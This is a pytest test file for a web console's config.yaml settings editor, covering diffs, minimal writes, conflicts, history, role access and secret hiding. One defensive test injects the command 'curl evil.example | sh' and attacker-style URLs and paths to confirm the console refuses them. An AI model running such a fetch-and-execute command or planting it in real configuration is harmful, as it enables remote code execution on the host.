"""Settings in the console: config.yaml as a form and as YAML, the difference before saving, the runner's own check,
only the changed lines written, conflicts, history and putting a version back, and who may see or change it."""

from __future__ import annotations

import hashlib
import html
import re
import urllib.parse
from pathlib import Path

import pytest
import yaml

pytest.importorskip("starlette")

from arceus_runner.config import Config  # noqa: E402
from arceus_runner.console import settings_form as sf  # noqa: E402
from arceus_runner.console.store import ConsoleStore  # noqa: E402
from arceus_runner.console.web import Settings  # noqa: E402
from arceus_runner.db import ReviewStore  # noqa: E402

from tests.conftest import EXAMPLE  # noqa: E402
from tests.test_console_auth import csrf_of, make_admin, signed_in  # noqa: E402
from tests.test_console_qa import person  # noqa: E402


@pytest.fixture
def w(tmp_path: Path):
    config = tmp_path / "config.yaml"
    text = EXAMPLE.read_text().replace("~/arceus/data/runner.db", str(tmp_path / "runner.db"))
    config.write_text(text)
    config.chmod(0o600)
    settings = Settings(config_path=config, db_path=tmp_path / "console" / "console.db")
    make_admin(settings)
    ReviewStore(tmp_path / "runner.db").close()

    class W:
        pass
    x = W()
    x.settings, x.config, x.db = settings, config, tmp_path / "runner.db"
    return x


def form_values(page: str) -> list[tuple[str, str]]:
    """What the browser sends for the section's form as it is: every input, select, textarea and checked box."""
    form = page.split('class="card settings-form"', 1)[1].split("</form>", 1)[0]
    out = []
    for m in re.finditer(r'<input([^>]*)>', form):
        attrs = m.group(1)
        name = re.search(r'name="([^"]+)"', attrs)
        if not name:
            continue
        kind = re.search(r'type="([^"]+)"', attrs)
        value = re.search(r'value="([^"]*)"', attrs)
        if kind and kind.group(1) == "checkbox":
            if " checked" in attrs:
                out.append((name.group(1), html.unescape(value.group(1)) if value else "on"))
            continue
        out.append((name.group(1), html.unescape(value.group(1)) if value else ""))
    for m in re.finditer(r'<textarea[^>]*name="([^"]+)"[^>]*>(.*?)</textarea>', form, re.S):
        out.append((m.group(1), html.unescape(m.group(2))))
    for m in re.finditer(r'<select[^>]*name="([^"]+)"[^>]*>(.*?)</select>', form, re.S):
        chosen = re.search(r"<option(?: value=\"([^\"]*)\")? selected>([^<]*)</option>", m.group(2))
        out.append((m.group(1), html.unescape(chosen.group(1) if chosen.group(1) is not None else chosen.group(2))))
    return out


def send(c, path: str, pairs: list[tuple[str, str]]) -> object:
    """A form with repeated names (checkboxes), encoded as a browser sends it."""
    return c.post(path, content=urllib.parse.urlencode(pairs).encode(),
                  headers={"Content-Type": "application/x-www-form-urlencoded"})


def change(c, section: str, **values) -> object:
    """Open a section, change some values as a person would, and send it for checking."""
    page = c.get(f"/settings/{section}/").text
    sent = [(k, v) for k, v in form_values(page) if k not in values]
    for k, v in values.items():
        sent += [(k, x) for x in v] if isinstance(v, list) else [(k, v)]
    return send(c, f"/settings/{section}/", sent)


def save_preview(c, preview: str, note: str = "") -> object:
    sha = re.search(r'name="sha" value="([^"]+)"', preview).group(1)
    text = html.unescape(re.search(r'<textarea name="text" hidden>(.*?)</textarea>', preview, re.S).group(1))
    origin = re.search(r'name="origin" value="([^"]+)"', preview).group(1)
    return c.post("/settings/save", data={"csrf": csrf_of(preview), "sha": sha, "text": text, "origin": origin,
                                          "note": note})


def test_every_setting_of_the_schema_is_in_the_form(w):
    admin = signed_in(w.settings, "owner@example.com")
    cfg = Config.model_validate(yaml.safe_load(w.config.read_text()))
    names = set()
    for section, fields in sf.sections(cfg, w.config.read_text()):
        page = admin.get(f"/settings/{section}/").text
        for f in sf.flatten(fields):
            assert f'name="{f.name}"' in page, f.name
            names.add(f.name)

    def leaves(model, value, prefix):
        for name, info in model.model_fields.items():
            key = info.alias or name
            v = getattr(value, name)
            if isinstance(v, Config.__mro__[1]) and f"{prefix}{key}" not in names:  # a nested model: its fields
                yield from leaves(type(v), v, f"{prefix}{key}.")
            else:
                yield f"{prefix}{key}"
    missing = [n for n in leaves(Config, cfg, "") if n not in names and not any(n.startswith(x + ".") for x in names)]
    assert missing == []


def test_a_change_shows_its_difference_and_then_writes_only_its_lines(w):
    before = w.config.read_text()
    admin = signed_in(w.settings, "owner@example.com")
    r = change(admin, "schedule", **{"schedule.poll_working": "3m", "schedule.working_hours.from": "08:30"})
    assert r.status_code == 200
    assert "-  poll_working: 2m" in r.text and "+  poll_working: 3m" in r.text
    assert "restart the runner" in r.text and "Saving restarts nothing" in r.text
    assert w.config.read_text() == before  # nothing written yet
    r = save_preview(admin, r.text, "fewer polls")
    assert r.status_code == 303 and "restart" in r.headers["location"]
    after = w.config.read_text()
    changed = [(a, b) for a, b in zip(before.splitlines(), after.splitlines()) if a != b]
    assert changed == [('  working_hours: { days: [mon, tue, wed, thu, fri], from: "09:00", to: "19:00" }',
                        '  working_hours: { days: [mon, tue, wed, thu, fri], from: "08:30", to: "19:00" }'),
                       ("  poll_working: 2m", "  poll_working: 3m")]
    assert len(before.splitlines()) == len(after.splitlines())
    assert w.config.stat().st_mode & 0o777 == 0o600
    with ConsoleStore(w.settings.db_path) as cs:
        v = cs.versions("config")[0]
    assert v["note"] == "fewer polls" and v["before_text"] == before and v["after_text"] == after


def test_nothing_changed_leaves_the_file_alone(w):
    before = w.config.read_bytes()
    mtime = w.config.stat().st_mtime_ns
    admin = signed_in(w.settings, "owner@example.com")
    for section in ("general", "tracker", "code_host", "schedule", "bulava", "cleanup", "paths"):
        r = change(admin, section)
        assert r.status_code == 200 and "Nothing changed" in r.text, section
    assert w.config.read_bytes() == before and w.config.stat().st_mtime_ns == mtime


def test_a_value_the_runner_refuses_shows_its_error_and_cannot_be_saved(w):
    before = w.config.read_text()
    admin = signed_in(w.settings, "owner@example.com")
    r = change(admin, "schedule", **{"schedule.poll_working": "soon"})
    assert "The runner would refuse this config.yaml" in r.text and "schedule.poll_working" in r.text
    assert "Save config.yaml" not in r.text
    # Sent anyway, straight to save: refused there too.
    page = admin.get("/settings/yaml/").text
    sha = re.search(r'name="sha" value="([^"]+)"', page).group(1)
    r = admin.post("/settings/save", data={"csrf": csrf_of(page), "sha": sha, "origin": "/settings/yaml/",
                                           "text": before.replace("mode: observe", "mode: sometimes")})
    assert "The runner would refuse" in r.text
    assert w.config.read_text() == before


def test_a_text_value_yaml_would_read_otherwise_is_written_quoted(w):
    admin = signed_in(w.settings, "owner@example.com")
    r = change(admin, "tracker", **{"tracker.tags.queue": "off"})
    assert "+    queue: &#34;off&#34;" in r.text
    assert save_preview(admin, r.text).status_code == 303
    assert yaml.safe_load(w.config.read_text())["tracker"]["tags"]["queue"] == "off"


def test_a_save_over_a_file_changed_meanwhile_is_refused_with_the_difference(w):
    admin = signed_in(w.settings, "owner@example.com")
    r = change(admin, "limits", **{"limits.max_review_rounds": "7"})
    assert "Save config.yaml" in r.text
    w.config.write_text(w.config.read_text().replace("mode: observe", "mode: live\nsecurity_note: x")
                        .replace("security_note: x\n", ""))  # another admin, over SSH
    r2 = save_preview(admin, r.text)
    assert r2.status_code == 409 and "changed while you were looking" in r2.text
    assert "max_review_rounds: 7" not in w.config.read_text()
    # A section opened before the file changed: its form is refused too.
    page = admin.get("/settings/limits/").text
    w.config.write_text(w.config.read_text() + "\n")
    r3 = send(admin, "/settings/limits/", form_values(page))
    assert r3.status_code == 409 and "changed since you opened this section" in r3.text


def test_the_whole_file_as_yaml_and_putting_a_version_back(w):
    original = w.config.read_text()
    admin = signed_in(w.settings, "owner@example.com")
    page = admin.get("/settings/yaml/").text
    sha = re.search(r'name="sha" value="([^"]+)"', page).group(1)
    edited = original.replace("max_ci_fix_attempts: 3", "max_ci_fix_attempts: 4")
    r = admin.post("/settings/yaml/", data={"csrf": csrf_of(page), "sha": sha, "text": edited, "note": "more CI"})
    assert "+  max_ci_fix_attempts: 4" in r.text
    assert save_preview(admin, r.text, "more CI").status_code == 303
    assert "max_ci_fix_attempts: 4" in w.config.read_text()
    with ConsoleStore(w.settings.db_path) as cs:
        vid = cs.versions("config")[0]["id"]
    page = admin.get("/settings/history/").text
    assert "more CI" in page and "Now in the file" in page
    page = admin.get(f"/settings/history/{vid}/").text
    assert "-  max_ci_fix_attempts: 3" in page and "+  max_ci_fix_attempts: 4" in page
    # Put back what was there before it: through the same check and difference.
    page = admin.get(f"/settings/yaml/?version={vid}&which=before").text
    assert "what was there before" in page and "max_ci_fix_attempts: 3" in page
    text = html.unescape(re.search(r'<textarea class="code" id="text" name="text"[^>]*>(.*?)</textarea>', page,
                                   re.S).group(1))
    r = admin.post("/settings/yaml/", data={"csrf": csrf_of(page), "text": text,
                                            "sha": re.search(r'name="sha" value="([^"]+)"', page).group(1)})
    assert "-  max_ci_fix_attempts: 4" in r.text
    assert save_preview(admin, r.text, "back").status_code == 303
    assert w.config.read_text() == original


def test_a_change_setup_applies_says_so(w):
    admin = signed_in(w.settings, "owner@example.com")
    r = change(admin, "bulava", **{"bulava.claude_checks.rounds": "2"})
    assert "setup.sh" in r.text and "run setup, then restart the runner" in r.text
    r = save_preview(admin, r.text)
    assert "run+setup" in r.headers["location"] or "setup" in r.headers["location"]


def test_a_map_is_edited_as_yaml_in_place(w):
    admin = signed_in(w.settings, "owner@example.com")
    r = change(admin, "review_agent", **{"review_agent.repos": "services/api:\n  tests: none\n"})
    assert "services/api" in r.text and "Save config.yaml" in r.text
    assert save_preview(admin, r.text).status_code == 303
    assert yaml.safe_load(w.config.read_text())["review_agent"]["repos"] == {"services/api": {"tests": "none"}}


def test_the_page_says_when_the_runner_runs_with_another_config(w):
    admin = signed_in(w.settings, "owner@example.com")
    assert "Not known whether the runner runs with this config.yaml" in admin.get("/settings/").text
    s = ReviewStore(w.db)
    s.set_state("config", {"sha256": hashlib.sha256(w.config.read_bytes()).hexdigest(),
                           "loaded_at": "2026-11-08T10:00:00+00:00"})
    s.close()
    assert "The runner runs with this config.yaml" in admin.get("/settings/").text
    r = change(admin, "limits", **{"limits.max_review_rounds": "6"})
    save_preview(admin, r.text)
    page = admin.get("/settings/").text
    assert "has changed since the runner started" in page and "still runs with the earlier settings" in page


def test_operators_see_everything_read_only_and_others_nothing(w):
    op = person(w.settings, "op@example.com", {"operator"})
    page = op.get("/settings/schedule/").text
    assert "poll_working" in page and " readonly" in page and "Check the change" not in page
    assert send(op, "/settings/schedule/", form_values(page)).status_code == 403
    yaml_page = op.get("/settings/yaml/").text
    assert "readonly" in yaml_page and "Check the change" not in yaml_page
    assert op.post("/settings/save", data={"csrf": csrf_of(page), "text": "x", "sha": "y"}).status_code == 403
    for roles in (set(), {"qa"}, {"architect"}):
        c = person(w.settings, f"{'-'.join(sorted(roles)) or 'n'}@example.com", roles)
        for path in ("/settings/", "/settings/schedule/", "/settings/yaml/", "/settings/history/"):
            assert c.get(path).status_code == 403, (roles, path)


def test_secrets_are_never_shown(w, tmp_path):
    (tmp_path / "secrets.env").write_text("GITLAB_TOKEN=glpat-very-secret\n")
    admin = signed_in(w.settings, "owner@example.com")
    for path in ("/settings/", "/settings/paths/", "/settings/yaml/", "/settings/code_host/"):
        assert "glpat-very-secret" not in admin.get(path).text


def test_a_broken_config_can_be_fixed_as_yaml(w):
    w.config.write_text(w.config.read_text().replace("mode: observe", "mode: sometimes"))
    admin = signed_in(w.settings, "owner@example.com")
    page = admin.get("/settings/").text
    assert "config.yaml does not load" in page and "Fix it as YAML" in page
    page = admin.get("/settings/yaml/").text
    text = html.unescape(re.search(r'name="text"[^>]*>(.*?)</textarea>', page, re.S).group(1))
    r = admin.post("/settings/yaml/", data={"csrf": csrf_of(page), "text": text.replace("mode: sometimes", "mode: observe"),
                                            "sha": re.search(r'name="sha" value="([^"]+)"', page).group(1)})
    assert save_preview(admin, r.text).status_code == 303
    assert "mode: observe" in w.config.read_text()


def test_a_value_inside_a_flow_mapping_changes_that_line_only_in_its_style():
    """`git_author: { name: ..., email: ... }` as people write it: a new name changes that line, with the spaces
    inside the braces kept, and nothing else in the file."""
    from starlette.datastructures import FormData
    text = EXAMPLE.read_text()
    cfg = Config.model_validate(yaml.safe_load(text))
    secs = dict(sf.sections(cfg, text))
    items = []
    for f in sf.flatten(secs["code_host"]):
        if f.kind == "bool":
            if f.shown:
                items.append((f.name, "on"))
        elif f.kind == "lines":
            items.append((f.name, "\n".join(f.shown)))
        else:
            items.append((f.name, {"code_host.git_author.name": "ACME Bot"}.get(f.name, f.shown or "")))
    out = sf.apply(text, secs["code_host"], FormData(items))
    diff = [(a, b) for a, b in zip(text.splitlines(), out.text.splitlines()) if a != b]
    assert diff == [('  git_author: { name: "ACME Agent", email: "acme-agent-bot@example.com" }',
                     '  git_author: { name: "ACME Bot", email: "acme-agent-bot@example.com" }')]
    assert len(text.splitlines()) == len(out.text.splitlines())


# -- writing only what changed -------------------------------------------------------------------------------------

def _apply(text: str, section: str, values: dict) -> str:
    """A section's form sent with these values changed, as the page would send it."""
    from starlette.datastructures import FormData
    cfg = Config.model_validate(yaml.safe_load(text))
    fields = dict(sf.sections(cfg, text))[section]
    items = []
    for f in sf.flatten(fields):
        v = values.get(f.name, f.shown)
        if f.kind == "bool":
            if v:
                items.append((f.name, "on"))
        elif f.kind == "multi":
            items += [(f.name, o) for o in v]
        elif f.kind == "lines":
            items.append((f.name, v if isinstance(v, str) else "\n".join(v)))
        else:
            items.append((f.name, v or ""))
    return sf.apply(text, fields, FormData(items)).text


def changed_lines(a: str, b: str) -> list[str]:
    import difflib
    return [x for x in difflib.unified_diff(a.splitlines(), b.splitlines(), lineterm="", n=0)
            if x[:1] in "+-" and not x.startswith(("+++", "---"))]


def test_lists_written_at_their_keys_column_stay_as_they_are():
    """`allowed_users:` with `- j.doe` at the key's own column is valid YAML people write; a change elsewhere does not
    reformat it."""
    text = EXAMPLE.read_text()
    text = re.sub(r"(\n  allowed_users:[^\n]*\n)((?:    - [^\n]*\n)+)",
                  lambda m: m.group(1) + m.group(2).replace("    - ", "  - "), text)
    assert "\n  - j.doe" in text
    out = _apply(text, "schedule", {"schedule.poll_working": "3m"})
    assert changed_lines(text, out) == ["-  poll_working: 2m", "+  poll_working: 3m"]
    out = _apply(text, "tracker", {"tracker.allowed_users": "j.doe\nnew.person"})
    assert "  - j.doe\n  - new.person\n" in out  # a changed list is written the file's way
    assert yaml.safe_load(out)["tracker"]["allowed_users"] == ["j.doe", "new.person"]


def test_a_hash_inside_a_value_is_kept_exactly():
    text = EXAMPLE.read_text()
    out = _apply(text, "code_host", {"code_host.git_author.name": "Bob # service", "code_host.bot_user": "bot # x"})
    loaded = yaml.safe_load(out)["code_host"]
    assert loaded["git_author"]["name"] == "Bob # service" and loaded["bot_user"] == "bot # x"
    lines = changed_lines(text, out)
    assert len(lines) == 4 and all("git_author" in x or "bot_user" in x for x in lines)
    assert '  git_author: { name: "Bob # service", email: "acme-agent-bot@example.com" }' in out
    assert "# the bot's username" in out  # the line's own comment stays


def test_every_duration_written_in_the_file_changes_on_its_own_line_only():
    text = EXAMPLE.read_text()
    cfg = Config.model_validate(yaml.safe_load(text))
    tried = 0
    for section, fields in sf.sections(cfg, text):
        for f in sf.flatten(fields):
            if f.kind != "duration" or not f.in_file:
                continue
            new = "7m" if f.shown != "7m" else "8m"
            out = _apply(text, section, {f.name: new})
            lines = changed_lines(text, out)
            assert len(lines) == 2 and lines[0].startswith("-") and lines[1].startswith("+"), (f.name, lines)
            node = yaml.safe_load(out)
            for key in f.path:
                node = node[key]
            assert node == new, f.name
            tried += 1
    assert tried >= 20


def test_a_setting_the_file_does_not_have_is_added_as_one_line_under_its_section():
    text = EXAMPLE.read_text()
    assert "stopped_after" not in text
    out = _apply(text, "cleanup", {"cleanup.stopped_after": "45m"})
    assert changed_lines(text, out) == ["+  stopped_after: 45m"]
    assert yaml.safe_load(out)["cleanup"]["stopped_after"] == "45m"
    Config.model_validate(yaml.safe_load(out))


def test_a_stale_form_keeps_the_persons_changes_on_top_of_the_newer_file(w):
    admin = signed_in(w.settings, "owner@example.com")
    page = admin.get("/settings/limits/").text
    # Meanwhile, over SSH: another value in another section.
    w.config.write_text(w.config.read_text().replace("poll_off_hours: 10m", "poll_off_hours: 20m"))
    sent = [(k, v) for k, v in form_values(page) if k != "limits.max_review_rounds"]
    r = send(admin, "/settings/limits/", sent + [("limits.max_review_rounds", "8")])
    assert r.status_code == 409
    assert "What changed on the server since you opened it" in r.text
    assert "-  poll_off_hours: 10m" in r.text and "+  poll_off_hours: 20m" in r.text  # theirs
    assert "+  max_review_rounds: 8" in r.text  # yours, on top of theirs
    assert "Nothing would change" not in r.text
    assert "max_review_rounds: 8" not in w.config.read_text()  # nothing written by itself
    assert save_preview(admin, r.text).status_code == 303
    after = yaml.safe_load(w.config.read_text())
    assert after["limits"]["max_review_rounds"] == 8 and after["schedule"]["poll_off_hours"] == "20m"


def test_the_yaml_editor_on_a_stale_page_shows_what_changed_on_the_server(w):
    admin = signed_in(w.settings, "owner@example.com")
    page = admin.get("/settings/yaml/").text
    original = html.unescape(re.search(r'name="text"[^>]*>(.*?)</textarea>', page, re.S).group(1))
    w.config.write_text(w.config.read_text().replace("poll_off_hours: 10m", "poll_off_hours: 20m"))
    fields = {"csrf": csrf_of(page), "sha": re.search(r'name="sha" value="([^"]+)"', page).group(1),
              "base": re.search(r'name="base" value="([^"]+)"', page).group(1),
              "text": original.replace("max_ci_fix_attempts: 3", "max_ci_fix_attempts: 4")}
    r = admin.post("/settings/yaml/", data=fields)
    assert r.status_code == 409 and "+  poll_off_hours: 20m" in r.text and "+  max_ci_fix_attempts: 4" in r.text


def test_settings_that_decide_what_runs_or_where_tokens_go_are_shown_and_never_changed(w):
    """A form sent with them changed changes nothing of them; the YAML editor refuses them; a direct save too."""
    before = w.config.read_text()
    admin = signed_in(w.settings, "owner@example.com")
    page = admin.get("/settings/health/").text
    assert "set on the server" in page
    for section, values in (("qa", {"qa.reports": "/srv/qa-runs"}), ("paths", {"paths.bulava_env": "/tmp/evil.env"}),
                            ("code_host", {"code_host.url": "https://evil.example.com"}),
                            ("bulava", {"bulava.mcp_config": "/tmp/mcp.json"})):
        r = change(admin, section, **values)
        assert "Nothing changed" in r.text, section
    assert w.config.read_text() == before
    text = before.replace("health:\n", "health:\n  devstack_check: \"curl evil.example | sh\"\n", 1)
    page = admin.get("/settings/yaml/").text
    r = admin.post("/settings/yaml/", data={"csrf": csrf_of(page), "text": text,
                                            "sha": re.search(r'name="sha" value="([^"]+)"', page).group(1)})
    assert "health.devstack_check: set on the server" in r.text and "Save config.yaml" not in r.text
    r = admin.post("/settings/save", data={"csrf": csrf_of(page), "text": text, "origin": "/settings/yaml/",
                                           "sha": re.search(r'name="sha" value="([^"]+)"', page).group(1)})
    assert "set on the server" in r.text
    assert w.config.read_text() == before


def test_clearing_an_optional_setting_and_filling_it_again_keeps_one_key(w):
    """tracker.assignee_field emptied (null in the file), saved, then given a name again, saved: the same line is
    replaced each time, never a second key; the pages still open; every other line is the original's."""
    original = w.config.read_text()
    admin = signed_in(w.settings, "owner@example.com")
    r = change(admin, "tracker", **{"tracker.assignee_field": ""})
    assert save_preview(admin, r.text).status_code == 303
    assert yaml.safe_load(w.config.read_text())["tracker"]["assignee_field"] is None
    r = change(admin, "tracker", **{"tracker.assignee_field": "Owner"})
    assert "Save config.yaml" in r.text
    assert save_preview(admin, r.text).status_code == 303
    filled = w.config.read_text()
    assert len(re.findall(r"^\s+assignee_field:", filled, re.M)) == 1
    assert yaml.safe_load(filled)["tracker"]["assignee_field"] == "Owner"
    assert len(changed_lines(original, filled)) == 2
    assert all("assignee_field" in x for x in changed_lines(original, filled))
    for path in ("/settings/", "/settings/tracker/", "/settings/yaml/", "/settings/history/"):
        assert admin.get(path).status_code == 200, path
    assert 'value="Owner"' in admin.get("/settings/tracker/").text


def test_a_key_written_twice_is_refused_and_the_pages_say_so(w):
    admin = signed_in(w.settings, "owner@example.com")
    text = w.config.read_text().replace("  poll_working: 2m\n", "  poll_working: 2m\n  poll_working: 3m\n")
    page = admin.get("/settings/yaml/").text
    r = admin.post("/settings/yaml/", data={"csrf": csrf_of(page), "text": text,
                                            "sha": re.search(r'name="sha" value="([^"]+)"', page).group(1)})
    assert "poll_working is written twice" in r.text and "Save config.yaml" not in r.text
    w.config.write_text(text)  # written so over SSH
    page = admin.get("/settings/")
    assert page.status_code == 200 and "poll_working is written twice" in page.text
    assert admin.get("/settings/schedule/").status_code == 303


@pytest.mark.parametrize("after_mode", ["\n\n", "\n", ""])
def test_a_comment_below_a_setting_is_not_its_hint(after_mode):
    # The last key of a block takes, in ruamel, the comments that follow it: the next section's header.
    doc = sf.load_doc(f"cleanup:\n  mode: act\n{after_mode}"
                      "# Optional. The agent tests the whole platform (qa.py).\nqa:\n  enabled: false\n")
    assert sf._comment(doc, ("cleanup", "mode")) == ""


def test_a_settings_own_comment_is_its_hint_and_nothing_below_it():
    doc = sf.load_doc("cleanup:\n  mode: act    # report: log what would go | act: remove it.\n"
                      "\n# Optional. The agent tests the whole platform (qa.py).\nqa:\n  enabled: false\n")
    assert sf._comment(doc, ("cleanup", "mode")) == "report: log what would go | act: remove it."


def test_a_commented_out_key_is_not_the_hint_of_the_key_above_it():
    doc = sf.load_doc("architect:\n  timeout: 4h\n  # repos: []    # which repositories\n"
                      "  first_look: 30d   # how far back\n")
    assert sf._comment(doc, ("architect", "timeout")) == ""
    assert sf._comment(doc, ("architect", "first_look")) == "how far back"


def test_cleanup_shows_no_help_of_the_section_after_it(w):
    # A server's file: cleanup ends with a bare `mode: act`, and the qa section comes right after it.
    text = w.config.read_text()
    qa = text[text.index("# Optional. The agent tests the whole platform"):text.index("# Optional. The agent reviews")]
    mode = next(line for line in text.splitlines(keepends=True) if line.startswith("  mode: report "))
    text = text.replace(qa, "").replace(mode, "")
    text = text.replace("# The web console", "  mode: act\n\n" + qa + "# The web console", 1)
    w.config.write_text(text)
    admin = signed_in(w.settings, "owner@example.com")
    page = admin.get("/settings/cleanup/")
    assert page.status_code == 200 and "<option selected>act</option>" in page.text
    assert "tests the whole platform" not in page.text and "qa.py" not in page.text
    qa_page = admin.get("/settings/qa/")
    assert qa_page.status_code == 200 and "past it the run is stopped and reported as unfinished" in qa_page.text
